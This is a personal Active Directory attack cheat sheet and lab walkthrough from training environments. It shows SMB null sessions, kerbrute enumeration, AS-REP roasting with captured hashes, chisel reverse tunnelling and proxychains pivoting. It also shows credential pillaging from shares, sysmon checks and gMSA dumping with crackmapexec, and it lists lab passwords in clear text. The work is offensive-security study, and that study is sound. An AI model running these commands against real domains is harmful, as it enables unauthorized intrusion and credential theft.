# Active Directory CheatSheet

### What I want to learn from this path.

    - Understand how kerberos and Kerbrute works!



### SMB service
-   using smbmap we can get the shares
    
    ```bash
    smbmap -H <host> -u 'null'
    # to perform the null session 
    ```


-   using smbclient

    ```bash
    smbclient -L //<host>/Shares -N
    # with -N we perform a null session

    smbclient //<host>/Shares -N
    # to connect without listing the shares
    ```
    

### LAPS
Local Administrator Password Solution. Is used to manage local account
passwords of Active Directory computers.




### LDAP (Lightweight directory access protocol)
Is a protocol that makes it possible for applications to query
user information rapidly.


the port fort ldap 389


Someone within your office wants to do two things: Send email to a
recent hire and print a copy of that conversation on a new printer.
LDAP (lightweight directory access protocol) makes both of those steps possible.

Set it up properly, and that employee doesn't need to talk with IT
to complete the tasks.


### What is LDAP?

Companies store usernames, passwords, email addresses, printers
connections, and other static data within directories. LDAP is an
open, vendor-natural application protocol for accessing and main-
taining that data. LDAP can also trackle authentication, so users can sign
on just once and access many different files on the server.

```bash
# user enumeration for ldap protocol 389

/opt/windapsearch.py -d <domain> --dc-ip <ip address>


GetADUsers.py -d <domain>/ -dc-ip <ip address> -debug
```


### Kerberos


With a several names, we get using user-anarchy, possible
usernames

and perform a kerbrute attack

```bash
kerbrute userenum -d <domain> --dc <ip address> user-list.txt
```

with this tool if there are any valid user in the user-list.txt
we get a hash referring to a Ticket Granted Ticket

```bash
❯ /opt/kerbrute  userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 unames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/29/23 - Ronnie Flathers @ropnop

2023/05/29 23:33:40 >  Using KDC(s):
2023/05/29 23:33:40 >   10.10.10.175:88

2023/05/29 23:33:40 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:bfd52a00b7693df3d6c4533635983c1f$78a4e39f138d5fecdd6cb4e0f9e7f8caaf0fc096f62de5e39e7d98b4e014dd4698958370c1cc99a93cd8873bdeb0c69748b5287cf2eb5dfd1226d46e47f0355d6f28d11af7b9817cbdefb2d4181c93f97c1e965ff770d4fc249f5affb3a8d7c66dee163b964fd6cbdf86ce4cf9e48977a323b900983c039107595e102cdd94f2f58401648dafc640000bdd47ac893093acf823ed196f006782e080b0bc7837996057e49e61f10bcb68da69ac0665b6ec9c1daf416636119397caea1341b1b6ec531d5b08fe746ff04e57b59509ffdb965187ef997b44c4d01ffd96478a63785f1d8841022d3c7126b6603502721a1548123610777cf7d667ac2e94a53907ca5ffaa4792d35fd1fd4b8dcf5bd0b5c326aa7878bf24294
2023/05/29 23:33:40 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2023/05/29 23:33:41 >  Done! Tested 24 usernames (1 valid) in 0.481 seconds
```

The code above it's an example of how can i do to get the TGT from kerbrute and
after that I cracked it and i get the password for the user fsmith and
connect it with evil-winrm


Inside the Powershell console, I started enumerating information

```powershell
net user <user>

# to get the ptivilege information about that user
whoami /priv

# to find any other resurce inside the Powershell I use

Get-ChildItem -Path "C:\Users\<User>" -Filter "name of file" -Recurse
```

## Further information

Using Winpeas.exe and updload it from the attack machine by evil-winrm
and get the information using evil-winrm

### Getting information using the Winpeas.exe

## Bloodhound

...


```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
gunzip -d chisel.gz
chmod +x chisel
./chisel server --reverse



wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
gunzip -d chisel.exe.gz
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 
```


Also we can run "proxychains4 -q" with other command to connect to the shared folders


```bash
proxychains4 -q smbmap -H 172.16.1.10 -u grace -p 'Inlanefreight01!' #enumerate the shared folders and its permissions
proxychains4 -q smbclient -L \\172.16.1.10 -U 'grace%Inlanefreight01!' # get list about the shared folders
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p 'Inlanefreight01!' --shares
```


## Assesments

SMB         172.16.15.3     445    DC01 
SMB         172.16.15.15    445    SQL01
SMB         172.16.15.20    445    DEV01


## Credentials found

Juliette:Password1
Atul:hooters1
sqldev:Sq!D3vUs3R


1) What's the password of the account you found?

```bash
❯ proxychains -q crackmapexec ldap dc01.inlanefreight.local -u users.txt -p '' --asreproast asreproast.txt
❯ /bin/cat asreproast.txt
$krb5asrep$23$Juliette@INLANEFREIGHT.LOCAL:8dd81f284cd7785da6fa5101d93a9812$a0bf2a2af98cc113a2f58cff307d7330807cd249a028d9c7f0444704688b863c5ce6551c548fcea206c691485e60b2aa49ccb66edd73b57baa08a8969173ab526bd6cbd240e6732e780fc680a453e9bf222cb2a7d9b7c51714c2a437397173c53d2a0e2d38c4125a504675d7733510d942ff4868d5d94afdc4d0dbc11b3b1a6c47cb0652ccad06ddf7210bde6dc3d9ca2f81027f42ba0d20eb0306822327ad4a679712fb7637bced977ec29faf4456b16f617dcc4bc260f7ab2b994e82769ac0c2f9967178e587235d3a610754ed2cdcb287bd29e20a6fc91431451c1f2dc9c2486ef4229086e3322f30aa6bd9f3cbd8f5724d8f7f2e61186feb

Juliette:Password1
```

2) Gain access to the SQL01 and submit the contents of the flag located in C:\Users\Public\flag.txt.

```bash
proxychains -q crackmapexec smb 172.16.15.15 -u Juliette -p Password1 --spider IPC$ --regex .


❯ proxychains -q crackmapexec smb 172.16.15.15 -u Juliette -p Password1 --share IPC$ --get-file "\MSSQL\$SQLEXPRESS\\sql\\query" query
SMB         172.16.15.15    445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.15    445    SQL01            [+] INLANEFREIGHT.LOCAL\Juliette:Password1 
SMB         172.16.15.15    445    SQL01            [*] Copying "\MSSQL$SQLEXPRESS\sql\query" to "query"
SMB         172.16.15.15    445    SQL01            [-] Error writing file "\MSSQL$SQLEXPRESS\sql\query" from share "IPC$": SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

# credentials found
Atul:hooters1



❯ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1  --share DEV --get-file sql_dev_creds.txt sql_dev_creds.txt
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1
SMB         172.16.15.3     445    DC01             [*] Copying "sql_dev_creds.txt" to "sql_dev_creds.txt"
SMB         172.16.15.3     445    DC01             [+] File "sql_dev_creds.txt" was downloaded to "sql_dev_creds.txt"

❯ proxychains4 -q crackmapexec mssql 172.16.15.15 -u sqldev -p 'Sq!D3vUs3R' --local-auth -M mssql_priv
MSSQL       172.16.15.15    1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
MSSQL       172.16.15.15    1433   SQL01            [+] sqldev:Sq!D3vUs3R
MSSQL_PR...                                         [*] sqldev can impersonate: netdb




## Credentials

Juliette:Password1
Atul:hooters1
sqldev:Sq!D3vUs3R

```bash
❯ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --local-groups
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
SMB         172.16.15.3     445    DC01             [+] Enumerated local groups
SMB         172.16.15.3     445    DC01             Cert Publishers                          membercount: 1
SMB         172.16.15.3     445    DC01             RAS and IAS Servers                      membercount: 0
SMB         172.16.15.3     445    DC01             Allowed RODC Password Replication Group  membercount: 0
SMB         172.16.15.3     445    DC01             Denied RODC Password Replication Group   membercount: 8
SMB         172.16.15.3     445    DC01             DnsAdmins                                membercount: 0
SMB         172.16.15.3     445    DC01             Access-Denied Assistance Users           membercount: 0
SMB         172.16.15.3     445    DC01             Server Operators                         membercount: 0
SMB         172.16.15.3     445    DC01             Account Operators                        membercount: 0
SMB         172.16.15.3     445    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
SMB         172.16.15.3     445    DC01             Incoming Forest Trust Builders           membercount: 0
SMB         172.16.15.3     445    DC01             Windows Authorization Access Group       membercount: 1
SMB         172.16.15.3     445    DC01             Terminal Server License Servers          membercount: 0
SMB         172.16.15.3     445    DC01             Administrators                           membercount: 3
SMB         172.16.15.3     445    DC01             Users                                    membercount: 3
SMB         172.16.15.3     445    DC01             Guests                                   membercount: 2
SMB         172.16.15.3     445    DC01             Print Operators                          membercount: 0
SMB         172.16.15.3     445    DC01             Backup Operators                         membercount: 0
SMB         172.16.15.3     445    DC01             Replicator                               membercount: 0
SMB         172.16.15.3     445    DC01             Remote Desktop Users                     membercount: 0
SMB         172.16.15.3     445    DC01             Network Configuration Operators          membercount: 0
SMB         172.16.15.3     445    DC01             Performance Monitor Users                membercount: 0
SMB         172.16.15.3     445    DC01             Performance Log Users                    membercount: 0
SMB         172.16.15.3     445    DC01             Distributed COM Users                    membercount: 0
SMB         172.16.15.3     445    DC01             IIS_IUSRS                                membercount: 0
SMB         172.16.15.3     445    DC01             Cryptographic Operators                  membercount: 0
SMB         172.16.15.3     445    DC01             Event Log Readers                        membercount: 0
SMB         172.16.15.3     445    DC01             Certificate Service DCOM Access          membercount: 1
SMB         172.16.15.3     445    DC01             RDS Remote Access Servers                membercount: 0
SMB         172.16.15.3     445    DC01             RDS Endpoint Servers                     membercount: 0
SMB         172.16.15.3     445    DC01             RDS Management Servers                   membercount: 0
SMB         172.16.15.3     445    DC01             Hyper-V Administrators                   membercount: 0
SMB         172.16.15.3     445    DC01             Access Control Assistance Operators      membercount: 0
SMB         172.16.15.3     445    DC01             Remote Management Users                  membercount: 0
SMB         172.16.15.3     445    DC01             Storage Replica Administrators           membercount: 0
❯ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --groups Administrators
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
SMB         172.16.15.3     445    DC01             [+] Enumerated members of domain group
SMB         172.16.15.3     445    DC01             INLANEFREIGHT.LOCAL\Domain Admins
SMB         172.16.15.3     445    DC01             INLANEFREIGHT.LOCAL\Enterprise Admins
SMB         172.16.15.3     445    DC01             INLANEFREIGHT.LOCAL\Administrator
❯ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --wmi "SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'"
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
❯ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p hooters1 --wmi "SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'"
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
❯ proxychains4 -q crackmapexec smb 172.16.15.3 -u Juliette -p Password1 --wmi "SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'"
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Juliette:Password1 
❯ proxychains4 -q crackmapexec smb 172.16.15.3 -u Juliette -p Password1 --wmi "SELECT * FROM MSPower_DeviceEnable" --wmi-namespace "root\WMI"
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Juliette:Password1 


❯ proxychains4 -q crackmapexec ldap dc01.inlanefreight.local -u Atul -p hooters1 --gmsa
SMB         224.0.0.1       445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        224.0.0.1       636    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
LDAP        224.0.0.1       636    DC01             [*] Getting GMSA Passwords
LDAP        224.0.0.1       636    DC01             Account: svc_devadm$          NTLM: 
```


```

3) Gain access to the DEV01 and submit the contents of the flag located in C:\Users\Administrator\Desktop\flag.txt.

```bash

```

4) Read the flag from the shared folder Ccache.

```bash

```

5) Gain access to the DC01 and submit the contents of the flag located in C:\Users\Administrator\Desktop\flag.txt.

```bash

```
